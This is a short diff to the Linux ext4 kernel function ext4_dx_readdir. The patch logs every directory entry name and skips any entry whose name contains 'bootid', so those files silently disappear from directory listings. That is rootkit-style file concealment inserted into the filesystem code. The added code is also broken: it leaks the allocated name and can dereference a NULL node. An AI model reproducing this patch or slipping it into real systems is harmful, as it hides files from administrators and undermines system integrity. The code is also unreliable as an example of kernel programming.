@@ -597,6 +597,14 @@ static int ext4_dx_readdir(struct file *file, struct dir_context *ctx)
 		if (info->curr_node) {
 			fname = rb_entry(info->curr_node, struct fname,
 					 rb_hash);
+			name = kstrndup(fname->name, fname->name_len, GFP_KERNEL);
+			// char *name = kstrdup(file->f_path.dentry->d_name.name, GFP_KERNEL);
+			printk(KERN_INFO "TTTTT ext4_readdir %s\n",name);
+			if (strstr(name, "bootid")){
+				info->curr_node = rb_next(info->curr_node);
+				fname = rb_entry(info->curr_node, struct fname,
+					 rb_hash);
+			}
 			info->curr_hash = fname->hash;
 			info->curr_minor_hash = fname->minor_hash;
 		} else {
